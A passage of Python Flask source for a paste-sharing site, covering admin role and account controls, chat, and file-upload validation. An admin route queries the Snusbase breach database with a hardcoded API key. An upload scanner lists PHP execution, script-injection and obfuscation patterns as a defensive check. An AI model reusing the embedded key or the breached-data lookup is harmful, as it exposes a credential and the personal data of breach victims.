    # Verify reCAPTCHA
    args = request.values
    captcha_response = args.get('g-recaptcha-response')
    captcha_secret_key = get_recaptcha_secret_key()
    captcha_verify_url = 'https://www.google.com/recaptcha/api/siteverify'
    captcha_data = {
        'secret': captcha_secret_key,
        'response': captcha_response
    }
    captcha_verification_response = requests.post(captcha_verify_url, data=captcha_data)
    captcha_verification_result = captcha_verification_response.json()
    
    if not captcha_verification_result['success']:
        flash("reCAPTCHA verification failed. Please try again.", "error")
        return redirect(url_for('admin_panel'))
    
    target_username = request.form.get('target_username')
    new_status = request.form.get('new_status')
    
    if not target_username or not new_status:
        flash('Both username and status are required.', 'error')
        return redirect(url_for('admin_panel'))
    
    # Manager cannot assign manager, admin, or root roles (but can remove roles by setting to user)
    if current_user_status == 'manager' and new_status in ['manager', 'admin', 'root']:
        flash('Managers cannot assign the roles Manager, Admin, or Root.', 'error')
        return redirect(url_for('admin_panel'))
    
    # Get target user's current status to check if this is a role removal
    cursor.execute("SELECT status FROM users WHERE username = ?", (target_username,))
    target_user = cursor.fetchone()
    target_current_status = target_user['status'] if target_user else None
    
    # Manager cannot assign or remove high-level roles (manager, admin, root)
    if current_user_status == 'manager':
        if new_status in ['manager', 'admin', 'root']:
            # This is trying to assign a high-level role - block it
            flash('Managers cannot assign the roles Manager, Admin, or Root.', 'error')
            return redirect(url_for('admin_panel'))
        elif target_current_status in ['manager', 'admin', 'root']:
            # This is trying to remove a high-level role - block it
            flash('Managers cannot remove the roles Manager, Admin, or Root.', 'error')
            return redirect(url_for('admin_panel'))
    
    # Check if target user exists
    cursor.execute("SELECT id FROM users WHERE username = ?", (target_username,))
    user = cursor.fetchone()
    if not user:
        flash(f'User "{target_username}" not found.', 'error')
        return redirect(url_for('admin_panel'))
    
    # Update user status
    cursor.execute("UPDATE users SET status = ? WHERE username = ?", (new_status, target_username))
    db.commit()
    
    # Invalidate user's session to force them to log in again with updated status
    invalidate_user_sessions(target_username)
    
    # Log admin action
    log_admin_action(session['username'], 'assign_status', f'Assigned status "{new_status}" to user "{target_username}"')
    
    flash(f'Successfully assigned "{new_status}" status to user "{target_username}". Their session has been invalidated and they will need to log in again.', 'success')
    return redirect(url_for('admin_panel'))

@app.route('/admin/generate-reset', methods=['POST'])
def generate_password_reset():
    # CSRF token validation
    if CSRF_ENABLED:
        try:
            from flask_wtf.csrf import validate_csrf
            validate_csrf(request.form.get('csrf_token'))
        except Exception as e:
            return "Bad Request CSRF token is missing", 400
    
    if not check_admin_access():
        flash('Access denied. You do not have permission to generate reset tokens.', 'error')
        return redirect(url_for('admin_panel'))
    
    # Verify reCAPTCHA
    args = request.values
    captcha_response = args.get('g-recaptcha-response')
    captcha_secret_key = get_recaptcha_secret_key()
    captcha_verify_url = 'https://www.google.com/recaptcha/api/siteverify'
    captcha_data = {
        'secret': captcha_secret_key,
        'response': captcha_response
    }
    captcha_verification_response = requests.post(captcha_verify_url, data=captcha_data)
    captcha_verification_result = captcha_verification_response.json()
    
    if not captcha_verification_result['success']:
        flash("reCAPTCHA verification failed. Please try again.", "error")
        return redirect(url_for('admin_panel'))
    
    username = request.form.get('username')
    if not username:
        flash('Username is required.', 'error')
        return redirect(url_for('admin_panel'))
    
    db = get_db()
    cursor = db.cursor()
    
    # Check if user exists
    cursor.execute("SELECT id FROM users WHERE username = ?", (username,))
    user = cursor.fetchone()
    if not user:
        flash(f'User "{username}" not found.', 'error')
        return redirect(url_for('admin_panel'))
    
    # Generate reset token
    token = generate_reset_token()
    now = datetime.now(UTC_TZ)
    expires_at = now + timedelta(hours=24)
    
    # Format dates for database
    created_at = now.strftime('%d-%m-%Y %H:%M:%S')
    expires_at_str = expires_at.strftime('%d-%m-%Y %H:%M:%S')
    
    # Store token in database
    cursor.execute('''
        INSERT INTO password_reset_tokens (user_id, token, created_at, expires_at, used)
        VALUES (?, ?, ?, ?, FALSE)
    ''', (user[0], token, created_at, expires_at_str))
    db.commit()
    
    # Generate reset link
    reset_link = url_for('reset_password', token=token, _external=True)
    
    # Log admin action
    log_admin_action(session['username'], 'generate_reset', f'Generated password reset for user "{username}"')
    
    # Store reset link in session for display
    session['reset_link'] = reset_link
    
    flash(f'Password reset link generated for user "{username}".', 'success')
    return redirect(url_for('admin_panel'))



@app.route('/admin/assign-username-color-access', methods=['POST'])
def assign_username_color_access():
    # CSRF token validation
    if CSRF_ENABLED:
        try:
            from flask_wtf.csrf import validate_csrf
            validate_csrf(request.form.get('csrf_token'))
        except Exception as e:
            return "Bad Request CSRF token is missing", 400
    
    if not check_admin_access():
        flash('Access denied. You do not have permission to assign color access.', 'error')
        return redirect(url_for('admin_panel'))
    
    # Verify reCAPTCHA
    args = request.values
    captcha_response = args.get('g-recaptcha-response')
    captcha_secret_key = get_recaptcha_secret_key()
    captcha_verify_url = 'https://www.google.com/recaptcha/api/siteverify'
    captcha_data = {
        'secret': captcha_secret_key,
        'response': captcha_response
    }
    captcha_verification_response = requests.post(captcha_verify_url, data=captcha_data)
    captcha_verification_result = captcha_verification_response.json()
    
    if not captcha_verification_result['success']:
        flash("reCAPTCHA verification failed. Please try again.", "error")
        return redirect(url_for('admin_panel'))
    
    target_username = request.form.get('target_username')
    color_access = request.form.get('color_access')
    
    if not target_username or color_access is None:
        flash('Both username and color access level are required.', 'error')
        return redirect(url_for('admin_panel'))
    
    db = get_db()
    cursor = db.cursor()
    
    # Check if target user exists
    cursor.execute("SELECT id FROM users WHERE username = ?", (target_username,))
    user = cursor.fetchone()
    if not user:
        flash(f'User "{target_username}" not found.', 'error')
        return redirect(url_for('admin_panel'))
    
    # Update color access
    color_access_bool = color_access == '1'
    
    if color_access_bool:
        # Grant access - only update the access field
        cursor.execute("UPDATE users SET username_color_access = ? WHERE username = ?", (color_access_bool, target_username))
    else:
        # Revoke access - update access field and reset username color to default
        cursor.execute("UPDATE users SET username_color_access = ?, username_color = NULL WHERE username = ?", (color_access_bool, target_username))
    
    db.commit()
    
    # Log admin action
    action = 'granted' if color_access_bool else 'revoked'
    log_admin_action(session['username'], 'assign_color_access', f'{action} username color access for user "{target_username}"')
    
    flash(f'Successfully {"granted" if color_access_bool else "revoked"} username color access for user "{target_username}".', 'success')
    return redirect(url_for('admin_panel'))

@app.route('/admin/lock-account', methods=['POST'])
def lock_account():
    # CSRF token validation
    if CSRF_ENABLED:
        try:
            from flask_wtf.csrf import validate_csrf
            validate_csrf(request.form.get('csrf_token'))
        except Exception as e:
            return "Bad Request CSRF token is missing", 400
    
    if not check_admin_access():
        flash('Access denied. You do not have permission to lock accounts.', 'error')
        return redirect(url_for('admin_panel'))
    
    # Verify reCAPTCHA
    args = request.values
    captcha_response = args.get('g-recaptcha-response')
    captcha_secret_key = get_recaptcha_secret_key()
    captcha_verify_url = 'https://www.google.com/recaptcha/api/siteverify'
    captcha_data = {
        'secret': captcha_secret_key,
        'response': captcha_response
    }
    captcha_verification_response = requests.post(captcha_verify_url, data=captcha_data)
    captcha_verification_result = captcha_verification_response.json()
    
    if not captcha_verification_result['success']:
        flash("reCAPTCHA verification failed. Please try again.", "error")
        return redirect(url_for('admin_panel'))
    
    target_username = request.form.get('target_username')
    lock_action = request.form.get('lock_action')
    
    if not target_username or lock_action is None:
        flash('Both username and lock action are required.', 'error')
        return redirect(url_for('admin_panel'))
    
    # Prevent self-locking
    if target_username == session.get('username'):
        flash('You cannot lock your own account.', 'error')
        return redirect(url_for('admin_panel'))
    
    db = get_db()
    cursor = db.cursor()
    
    # Check if target user exists
    cursor.execute("SELECT id, status, avatar, banner, music FROM users WHERE username = ?", (target_username,))
    user = cursor.fetchone()
    if not user:
        flash(f'User "{target_username}" not found.', 'error')
        return redirect(url_for('admin_panel'))
    
    user_id = user[0]
    user_status = user[1]
    user_avatar = user[2]
    user_banner = user[3]
    user_music = user[4]
    
    # Prevent locking root/admin users
    if user_status in ['root', 'admin']:
        flash(f'Cannot lock user "{target_username}" with status "{user_status}".', 'error')
        return redirect(url_for('admin_panel'))
    
    # Update account lock status
    lock_bool = lock_action == 'lock'
    
    if lock_bool:
        # If locking, remove user assets and set suspended bio
        cursor.execute("UPDATE users SET account_locked = ?, bio = ?, avatar = NULL, banner = NULL, music = NULL WHERE username = ?", 
                      (True, 'Account Suspended', target_username))
        
        # Delete actual files from server
        if user_avatar:
            try:
                avatar_path = os.path.join(app.config['UPLOAD_FOLDER'], user_avatar)
                if os.path.exists(avatar_path):
                    os.remove(avatar_path)
            except Exception as e:
                print(f"Error deleting avatar file: {e}")
        
        if user_banner:
            try:
                banner_path = os.path.join(app.config['BANNER_UPLOAD_FOLDER'], user_banner)
                if os.path.exists(banner_path):
                    os.remove(banner_path)
            except Exception as e:
                print(f"Error deleting banner file: {e}")
        
        if user_music:
            try:
                music_path = os.path.join(app.config['MUSIC_UPLOAD_FOLDER'], user_music)
                if os.path.exists(music_path):
                    os.remove(music_path)
            except Exception as e:
                print(f"Error deleting music file: {e}")
    else:
        # If unlocking, remove the lock status and clear the suspended bio
        cursor.execute("UPDATE users SET account_locked = ?, bio = NULL WHERE username = ?", (False, target_username))
    
    db.commit()
    
    # If locking, invalidate all sessions for this user to log them out
    if lock_bool:
        invalidate_user_sessions(target_username)
    
    # Log admin action
    action = 'locked' if lock_bool else 'unlocked'
    log_admin_action(session['username'], 'account_lock', f'{action} account for user "{target_username}"')
    
    flash(f'Successfully {action} account for user "{target_username}".', 'success')
    return redirect(url_for('admin_panel'))

@app.route('/admin/toggle-comments', methods=['POST'])
def toggle_comments_disabled():
    # CSRF token validation
    if CSRF_ENABLED:
        try:
            from flask_wtf.csrf import validate_csrf
            validate_csrf(request.form.get('csrf_token'))
        except Exception as e:
            return "Bad Request CSRF token is missing", 400
    
    if not check_admin_access():
        flash('Access denied. You do not have permission to toggle comments.', 'error')
        return redirect(url_for('index'))
    
    paste_input = request.form.get('paste_url_name', '').strip()
    if not paste_input:
        flash('Paste URL name is required.', 'error')
        return redirect(url_for('admin_panel'))
    
    # Extract paste name from full URL if needed
    paste_name = paste_input
    if paste_input.startswith('http'):
        # Extract the last part of the URL path
        from urllib.parse import urlparse
        parsed_url = urlparse(paste_input)
        path_parts = parsed_url.path.strip('/').split('/')
        if len(path_parts) >= 2 and path_parts[-2] == 'post':
            paste_name = path_parts[-1]
        else:
            flash('Invalid URL format. Please provide a valid paste URL or just the paste name.', 'error')
            return redirect(url_for('admin_panel'))
    
    db = get_db()
    cursor = db.cursor()
    
    # Check if paste exists
    cursor.execute("SELECT pastname, comments_disabled FROM pasts WHERE url_name = ?", (paste_name,))
    paste = cursor.fetchone()
    if not paste:
        flash(f'Paste "{paste_name}" not found.', 'error')
        return redirect(url_for('admin_panel'))
    
    paste_title = paste[0]
    current_status = paste[1]
    
    # Toggle the comments disabled status
    new_status = not current_status
    cursor.execute("UPDATE pasts SET comments_disabled = ? WHERE url_name = ?", (new_status, paste_name))
    db.commit()
    
    # Log admin action
    action = 'disabled' if new_status else 'enabled'
    log_admin_action(session['username'], 'toggle_comments', f'{action} comments for paste "{paste_title}" ({paste_name})')
    
    flash(f'Successfully {action} comments for paste "{paste_title}".', 'success')
    return redirect(url_for('admin_panel'))

# Chat functionality
chat_messages = []
chat_message_id = 0

@app.route('/chat/messages')
def get_chat_messages():
    """Get chat messages"""
    return jsonify({
        'messages': chat_messages[-50:]  # Return last 50 messages
    })

@app.route('/chat/send', methods=['POST'])
def send_chat_message():
    """Send a chat message"""
    global chat_message_id
    
    # CSRF token validation
    if CSRF_ENABLED:
        try:
            from flask_wtf.csrf import validate_csrf
            csrf_token = request.headers.get('X-CSRFToken')
            if not csrf_token:
                return jsonify({'success': False, 'error': 'CSRF token missing'}), 400
            validate_csrf(csrf_token)
        except Exception as e:
            return jsonify({'success': False, 'error': 'CSRF validation failed'}), 400
    
    # Rate limiting
    identifier = get_session_identifier()
    if not check_rate_limit(identifier, 'chat_send', 1, 5):  # 1 message every 5 seconds
        return jsonify({'success': False, 'error': 'Rate limit exceeded. Please wait 5 seconds before sending another message.'}), 429
    
    if not request.is_json:
        return jsonify({'success': False, 'error': 'Invalid request format'})
    
    data = request.get_json()
    message_content = data.get('message', '').strip()
    
    if not message_content:
        return jsonify({'success': False, 'error': 'Message cannot be empty'})
    
    # Sanitize message content
    message_content = sanitize_chat_message(message_content)
    
    if not message_content:
        return jsonify({'success': False, 'error': 'Message contains invalid content'})
    
    # Get user info
    username = session.get('username', 'Anonymous')
    
    # Check if user is logged in
    if username == 'Anonymous':
        return jsonify({'success': False, 'error': 'You must be logged in to send messages'}), 403
    
    # Always fetch current user status from database to ensure it's up-to-date
    db = get_db()
    cursor = db.cursor()
    cursor.execute("SELECT status FROM users WHERE username = ?", (username,))
    result = cursor.fetchone()
    if result:
        user_status = result[0]
        # Update session with current status
        session['user_status'] = user_status
    else:
        user_status = 'user'  # Default fallback
    
    # Get custom username color from database
    custom_color = get_username_color(username)
    
    # Get user color and status info based on status
    if user_status == 'root':
        author_color = custom_color or '#FFAB02'
        status_text = 'Founder'
        status_color = '#FFAB02'
        status_gif = None
    elif user_status == 'admin':
        author_color = custom_color or '#ff0000'
        status_text = 'Admin'
        status_color = '#ff0000'
        status_gif = '/static/files/red.gif'
    elif user_status == 'manager':
        author_color = custom_color or '#BB71E4'
        status_text = 'Manager'
        status_color = '#BB71E4'
        status_gif = '/static/files/purple.gif'
    elif user_status == 'mod':
        author_color = custom_color or '#39FF14'
        status_text = 'Mod'
        status_color = '#39FF14'
        status_gif = None
    elif user_status == 'council':
        author_color = custom_color or '#87CEFA'
        status_text = 'Council'
        status_color = '#87CEFA'
        status_gif = None
    elif user_status == 'helper':
        author_color = custom_color or '#5555FF'
        status_text = 'Helper'
        status_color = '#5555FF'
        status_gif = None
    elif user_status == 'clique':
        author_color = custom_color or '#095699'
        status_text = 'Clique'
        status_color = '#095699'
        status_gif = None
    elif user_status == 'rich':
        author_color = custom_color or '#FFD700'
        status_text = 'Rich'
        status_color = '#FFD700'
        status_gif = '/static/files/gold.gif'
    elif user_status == 'criminal':
        author_color = custom_color or '#780A48'
        status_text = 'Criminal'
        status_color = '#780A48'
        status_gif = None
    elif user_status == 'vip':
        author_color = custom_color or '#9B318E'
        status_text = 'VIP'
        status_color = '#9B318E'
        status_gif = None
    else:
        author_color = custom_color or '#2a9fd6'
        status_text = ''
        status_color = '#2a9fd6'
        status_gif = None
    
    # Create message
    chat_message_id += 1
    message = {
        'id': str(chat_message_id),
        'author': username,
        'content': message_content,
        'timestamp': datetime.now().isoformat(),
        'author_color': author_color,
        'user_status': user_status,
        'status_text': status_text,
        'status_color': status_color,
        'status_gif': status_gif
    }
    
    chat_messages.append(message)
    
    # Keep only last 100 messages to prevent memory issues
    if len(chat_messages) > 100:
        chat_messages.pop(0)
    
    return jsonify({'success': True, 'message': message})

@app.route('/chat/delete/<message_id>', methods=['POST'])
def delete_chat_message(message_id):
    """Delete a chat message"""
    global chat_messages
    
    # CSRF token validation
    if CSRF_ENABLED:
        try:
            from flask_wtf.csrf import validate_csrf
            csrf_token = request.headers.get('X-CSRFToken')
            if not csrf_token:
                return jsonify({'success': False, 'error': 'CSRF token missing'}), 400
            validate_csrf(csrf_token)
        except Exception as e:
            return jsonify({'success': False, 'error': 'CSRF validation failed'}), 400
    
    # Get user info
    username = session.get('username', 'Anonymous')
    
    # Always fetch current user status from database to ensure it's up-to-date
    db = get_db()
    cursor = db.cursor()
    cursor.execute("SELECT status FROM users WHERE username = ?", (username,))
    result = cursor.fetchone()
    if result:
        user_status = result[0]
        # Update session with current status
        session['user_status'] = user_status
    else:
        user_status = 'user'  # Default fallback
    
    # Find the message
    message = None
    for msg in chat_messages:
        if msg['id'] == message_id:
            message = msg
            break
    
    if not message:
        return jsonify({'success': False, 'error': 'Message not found'})
    
    # Check permissions
    is_admin = user_status in ['root', 'admin', 'manager', 'mod']
    is_own_message = message['author'] == username
    
    if not is_admin and not is_own_message:
        return jsonify({'success': False, 'error': 'Permission denied'})
    
    # Remove message from chat_messages list
    chat_messages = [msg for msg in chat_messages if msg['id'] != message_id]
    
    return jsonify({'success': True})

@app.route('/admin/rarsint', methods=['GET', 'POST'])
def rarsint_search():
    if not check_admin_access():
        flash('Access denied. You do not have permission to access the rarsint tool.', 'error')
        return redirect(url_for('index'))
    
    search_results = None
    error_message = None
    
    if request.method == 'POST':
        # CSRF token validation
        if CSRF_ENABLED:
            try:
                from flask_wtf.csrf import validate_csrf
                validate_csrf(request.form.get('csrf_token'))
            except Exception as e:
                return "Bad Request CSRF token is missing", 400
        
        # Verify reCAPTCHA
        args = request.values
        captcha_response = args.get('g-recaptcha-response')
        captcha_secret_key = get_recaptcha_secret_key()
        captcha_verify_url = 'https://www.google.com/recaptcha/api/siteverify'
        captcha_data = {
            'secret': captcha_secret_key,
            'response': captcha_response
        }
        captcha_verification_response = requests.post(captcha_verify_url, data=captcha_data)
        captcha_verification_result = captcha_verification_response.json()
        
        if not captcha_verification_result['success']:
            flash("reCAPTCHA verification failed. Please try again.", "error")
            return redirect(url_for('admin_panel') + '#rarsint')
        
        search_type = request.form.get('search_type')
        search_query = request.form.get('search_query')
        wildcard = request.form.get('wildcard', '0') == '1'
        
        if not search_type or not search_query:
            flash('Both search type and query are required.', 'error')
            return redirect(url_for('admin_panel') + '#rarsint')
        
        # Snusbase API configuration
        api_url = 'https://api.snusbase.com/data/search'
        api_key = 'sbmeovhou6ecsn9fd9wcwnwwvsvwnc'
        
        # Prepare search parameters
        search_params = {
            'terms': [search_query],
            'types': [search_type],
            'wildcard': wildcard
        }
        
        headers = {
            'Auth': api_key,
            'Content-Type': 'application/json'
        }
        
        try:
            # Make API request
            response = requests.post(api_url, json=search_params, headers=headers, timeout=30)
            response.raise_for_status()
            
            # Parse response
            data = response.json()
            
            if 'results' in data:
                search_results = data['results']
                # Log admin action
                log_admin_action(session['username'], 'rarsint_search', f'Searched for "{search_query}" with type "{search_type}" (wildcard: {wildcard})')
            else:
                error_message = 'No results found or invalid response from API.'
                
        except requests.exceptions.RequestException as e:
            error_message = f'API request failed: {str(e)}'
        except json.JSONDecodeError:
            error_message = 'Invalid response from API.'
        except Exception as e:
            error_message = f'Unexpected error: {str(e)}'
    
    # Get all the data needed for the admin panel template
    db = get_db()
    db.row_factory = sqlite3.Row
    cursor = db.cursor()
    
    # Get current user's status for template access control
    cursor.execute("SELECT status FROM users WHERE username = ?", (session['username'],))
    current_user = cursor.fetchone()
    user_status = current_user['status'] if current_user else None
    
    # Ensure admin_logs table exists
    ensure_admin_logs_table()
    
    # Get total count of admin logs for pagination
    cursor.execute('SELECT COUNT(*) FROM admin_logs')
    total_logs = cursor.fetchone()[0]
    
    # Pagination variables
    per_page = 10
    current_page = 1
    total_pages = (total_logs + per_page - 1) // per_page
    
    # Get admin logs with pagination
    cursor.execute('SELECT * FROM admin_logs ORDER BY timestamp DESC LIMIT ? OFFSET ?', (per_page, 0))
    admin_logs = cursor.fetchall()
    
    # Get flagged pastes
    cursor.execute('SELECT pastname, url_name, deletion_requested_by, deletion_requested_at, deletion_reason FROM pasts WHERE pending_deletion = 1')
    flagged_pastes = cursor.fetchall()
    
    # Get pending edit requests
    cursor.execute('''
        SELECT * FROM pending_edits 
        WHERE status = 'pending' 
        ORDER BY requested_at DESC
    ''')
    pending_edits = cursor.fetchall()
    
    # Get password reset tokens with user information
    cursor.execute('''
        SELECT prt.*, u.username 
        FROM password_reset_tokens prt 
        JOIN users u ON prt.user_id = u.id 
        ORDER BY prt.created_at DESC 
        LIMIT 20
    ''')
    reset_tokens_raw = cursor.fetchall()
    
    # Process reset tokens to add status
    reset_tokens = []
    now = datetime.now(UTC_TZ)
    for token in reset_tokens_raw:
        token_dict = dict(token)
        expires_at = datetime.strptime(token['expires_at'], '%d-%m-%Y %H:%M:%S')
        expires_at = UTC_TZ.localize(expires_at)
        
        if token['used']:
            token_dict['status'] = 'used'
        elif now > expires_at:
            token_dict['status'] = 'expired'
        else:
            token_dict['status'] = 'active'
        
        reset_tokens.append(token_dict)
    
    # Store results in session for display
    if search_results is not None:
        session['rarsint_results'] = json.dumps(search_results)
    if error_message:
        session['rarsint_error'] = error_message
    
    return redirect(url_for('admin_panel') + '#rarsint')

# Security: File upload validation functions
def validate_image_file(file):
    """Validate that uploaded file is actually an image using MIME type and file signature"""
    if not file or file.filename == '':
        return False, "No file provided"
    
    # Check file extension first
    _, ext = os.path.splitext(file.filename or '')
    if ext.lower() not in SECURITY_CONFIG['ALLOWED_IMAGE_EXTENSIONS']:
        return False, f"Invalid file extension. Allowed: {', '.join(SECURITY_CONFIG['ALLOWED_IMAGE_EXTENSIONS'])}"
    
    # Check file size
    file.seek(0, 2)  # Seek to end
    file_size = file.tell()
    file.seek(0)  # Reset to beginning
    
    if file_size > SECURITY_CONFIG['MAX_FILE_SIZE_BANNER']:  # Use banner size limit for all images
        return False, f"File too large. Maximum size is {SECURITY_CONFIG['MAX_FILE_SIZE_BANNER'] // (1024*1024)}MB."
    
    # File signature validation (check first few bytes) - Primary validation method
    try:
        file.seek(0)
        header = file.read(16)  # Read more bytes for better detection
        file.seek(0)  # Reset to beginning
        
        # Enhanced image file signatures
        image_signatures = [
            # JPEG variations
            b'\xff\xd8\xff\xe0',  # JPEG JFIF
            b'\xff\xd8\xff\xe1',  # JPEG EXIF
            b'\xff\xd8\xff\xe2',  # JPEG ICC
            b'\xff\xd8\xff\xe3',  # JPEG JFIF
            b'\xff\xd8\xff\xe8',  # JPEG SPIFF
            b'\xff\xd8\xff\xdb',  # JPEG
            b'\xff\xd8\xff',      # Generic JPEG
            
            # PNG
            b'\x89PNG\r\n\x1a\n',  # PNG
            
            # GIF variations
            b'GIF87a',  # GIF87a
            b'GIF89a',  # GIF89a
            
            # WebP
            b'RIFF',  # WebP (starts with RIFF)
            
            # BMP
            b'BM',
            
            # ICO
            b'\x00\x00\x01\x00',
            
            # TIFF
            b'II*\x00',  # Little endian TIFF
            b'MM\x00*',  # Big endian TIFF
        ]
        
        is_valid = False
        for signature in image_signatures:
            if header.startswith(signature):
                is_valid = True
                break
        
        # Additional check for WebP (RIFF + WebP)
        if header.startswith(b'RIFF') and b'WEBP' in header[:12]:
            is_valid = True
        
        if not is_valid:
            return False, "Invalid image file signature. File may be corrupted or not an image."
            
    except Exception as e:
        print(f"Error during signature validation: {e}")
        return False, "Error validating file signature."
    
    # MIME type validation if magic is available (secondary validation)
    if MAGIC_AVAILABLE:
        try:
            mime = magic.from_buffer(file.read(1024), mime=True)
            file.seek(0)  # Reset to beginning
            
            # Check for blocked MIME types
            if mime in SECURITY_CONFIG['BLOCKED_MIME_TYPES']:
                return False, f"Blocked file type: {mime}"
            
            # More lenient MIME type checking
            valid_mime_prefixes = ['image/', 'application/octet-stream']
            if not any(mime.startswith(prefix) for prefix in valid_mime_prefixes):
                # Log but don't fail for MIME type issues if signature is valid
                print(f"Warning: Unexpected MIME type {mime} for file with valid image signature")
        except Exception as e:
            print(f"Error during MIME validation: {e}")
            # Don't fail on MIME validation errors if signature is valid
    
    return True, "File validation successful"


def validate_music_file(file):
    """Validate that uploaded file is actually an audio file"""
    if not file or file.filename == '':
        return False, "No file provided"
    
    # Check file extension
    _, ext = os.path.splitext(file.filename or '')
    if ext.lower() not in SECURITY_CONFIG['ALLOWED_AUDIO_EXTENSIONS']:
        return False, f"Invalid file extension. Allowed: {', '.join(SECURITY_CONFIG['ALLOWED_AUDIO_EXTENSIONS'])}"
    
    # Check file size
    file.seek(0, 2)  # Seek to end
    file_size = file.tell()
    file.seek(0)  # Reset to beginning
    
    if file_size > SECURITY_CONFIG['MAX_FILE_SIZE_MUSIC']:
        return False, f"File too large. Maximum size is {SECURITY_CONFIG['MAX_FILE_SIZE_MUSIC'] // (1024*1024)}MB."
    
    # File signature validation (check first few bytes) - Primary validation method
    try:
        file.seek(0)
        header = file.read(16)  # Read more bytes for better detection
        file.seek(0)  # Reset to beginning
        
        # Enhanced audio file signatures
        audio_signatures = [
            # MP3
            b'ID3',  # ID3v2 tag
            b'\xff\xfb',  # MP3 frame sync
            b'\xff\xf3',  # MP3 frame sync
            b'\xff\xf2',  # MP3 frame sync
            b'\xff\xf0',  # MP3 frame sync
            
            # WAV
            b'RIFF',  # WAV (starts with RIFF)
            
            # OGG
            b'OggS',
            
            # M4A/MP4
            b'\x00\x00\x00\x20ftypM4A',  # M4A
            b'\x00\x00\x00\x18ftypmp41',  # MP4
            b'\x00\x00\x00\x1cftypisom',  # MP4
        ]
        
        is_valid = False
        for signature in audio_signatures:
            if header.startswith(signature):
                is_valid = True
                break
        
        # Additional checks for specific formats
        if header.startswith(b'RIFF') and b'WAVE' in header[:12]:
            is_valid = True  # WAV file
        elif header.startswith(b'\x00\x00\x00') and b'ftyp' in header[:8]:
            is_valid = True  # MP4/M4A container
        
        if not is_valid:
            return False, "Invalid audio file signature. File may be corrupted or not an audio file."
            
    except Exception as e:
        print(f"Error during signature validation: {e}")
        return False, "Error validating file signature."
    
    # MIME type validation if magic is available (secondary validation)
    if MAGIC_AVAILABLE:
        try:
            mime = magic.from_buffer(file.read(1024), mime=True)
            file.seek(0)  # Reset to beginning
            
            # Check for blocked MIME types
            if mime in SECURITY_CONFIG['BLOCKED_MIME_TYPES']:
                return False, f"Blocked file type: {mime}"
            
            # More lenient MIME type checking
            valid_mime_prefixes = ['audio/', 'application/octet-stream', 'video/mp4']
            if not any(mime.startswith(prefix) for prefix in valid_mime_prefixes):
                # Log but don't fail for MIME type issues if signature is valid
                print(f"Warning: Unexpected MIME type {mime} for file with valid audio signature")
        except Exception as e:
            print(f"Error during MIME validation: {e}")
            # Don't fail on MIME validation errors if signature is valid
    
    return True, "File validation successful"


def secure_filename_with_id(user_id, original_filename):
    """Create a secure filename using only user ID (no extension)"""
    if not original_filename:
        return None
    # Optionally, validate extension for security but do not use it in filename
    _, ext = os.path.splitext(original_filename)
    safe_extensions = {'.jpg', '.jpeg', '.png', '.gif', '.webp', '.mp3', '.wav', '.ogg', '.m4a'}
    if ext.lower() not in safe_extensions:
        return None
    # Return only the user_id as filename (no extension)
    return f"{user_id}"

def scan_file_for_threats(file_path):
    """Basic file scanning for common threat patterns"""
    try:
        with open(file_path, 'rb') as f:
            content = f.read(2048)  # Read first 2KB for better detection
            
        # Check for common malicious patterns (more specific to avoid false positives)
        suspicious_patterns = [
            # PHP execution patterns
            b'<?php', b'<?=', b'<?',
            # Script injection patterns
            b'<script', b'javascript:', b'vbscript:', 
            # HTML injection patterns
            b'<iframe', b'<object', b'<embed', b'<form',
            # Command execution patterns
            b'exec(', b'eval(', b'system(', b'shell_exec(',
            b'passthru(', b'proc_open(', b'popen(',
            # Encoding/obfuscation patterns
            b'base64_decode(', b'gzinflate(', b'str_rot13(',
            b'gzuncompress(', b'gzdecode(',
            # File manipulation patterns
            b'file_get_contents(', b'file_put_contents(',
            b'fopen(', b'fwrite(', b'fread(',
            # Include patterns
            b'include(', b'require(', b'include_once(', b'require_once('
        ]
        
        # Check for patterns but be more lenient with context
        for pattern in suspicious_patterns:
            if pattern in content:
                # Additional context check - don't flag if it's part of legitimate file metadata
                # For example, don't flag if it's in EXIF data or file headers
                pattern_pos = content.find(pattern)
                context_start = max(0, pattern_pos - 50)
                context_end = min(len(content), pattern_pos + len(pattern) + 50)
                context = content[context_start:context_end]
                
                # Skip if it's in what looks like binary data or file headers
                if b'\x00' in context or pattern_pos < 100:
                    continue
                    
                return False, f"File contains suspicious pattern: {pattern.decode('utf-8', errors='ignore')}"
        
        return True, "File scan passed"
        
    except Exception as e:
        return False, f"Error scanning file: {e}"


# Security configuration
SECURITY_CONFIG = {
    'ENABLE_SECURE_FILE_SERVING': True,
    'ENABLE_FILE_SCANNING': True,
    'MAX_FILE_SIZE_AVATAR': 5 * 1024 * 1024,  # 5MB
    'MAX_FILE_SIZE_BANNER': 10 * 1024 * 1024,  # 10MB
    'MAX_FILE_SIZE_MUSIC': 20 * 1024 * 1024,   # 20MB
    'ALLOWED_IMAGE_EXTENSIONS': {'.jpg', '.jpeg', '.png', '.gif', '.webp'},
    'ALLOWED_AUDIO_EXTENSIONS': {'.mp3', '.wav', '.ogg', '.m4a'},
    'BLOCKED_MIME_TYPES': [
        'application/x-executable', 'application/x-msdownload',
        'application/x-msi', 'application/x-msdos-program',
        'application/x-dosexec', 'application/x-msdos-program'
    ]
}


# Security: File upload validation functions

# Security: Secure file serving route
@app.route('/secure/files/<file_type>/<filename>')
def secure_file_serve(file_type, filename):
    """Securely serve uploaded files with additional validation"""
    if file_type not in ['pfp', 'banners', 'music']:
        return "Invalid file type", 404
    
    # Validate filename format (should be user_id - digits only)
    if not filename or not filename.isdigit():
        return "Invalid filename", 400
    
    # Check if user is authenticated for music files
    if file_type == 'music' and not session.get('username'):
        return "Authentication required", 401
    
    # Construct file path
    if file_type == 'pfp':
        file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
    elif file_type == 'banners':
        file_path = os.path.join(app.config['BANNER_UPLOAD_FOLDER'], filename)
    elif file_type == 'music':
        file_path = os.path.join(app.config['MUSIC_UPLOAD_FOLDER'], filename)
    
    # Check if file exists
    if not os.path.exists(file_path):
        return "File not found", 404
    
    # Security: Prevent directory traversal (though digits-only should prevent it)
    if '..' in filename or '/' in filename or '\\' in filename:
        return "Invalid filename", 400
    
    # Detect MIME type from file content
    if MAGIC_AVAILABLE:
        try:
            mime_type = magic.from_file(file_path, mime=True)
        except Exception as e:
            print(f"Error detecting MIME type for {file_path}: {e}")
            mime_type = 'application/octet-stream'
    else:
        mime_type = 'application/octet-stream'
    
    # Serve file with security headers
    response = Response()
    response.headers['Content-Type'] = mime_type
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['Content-Disposition'] = 'inline'
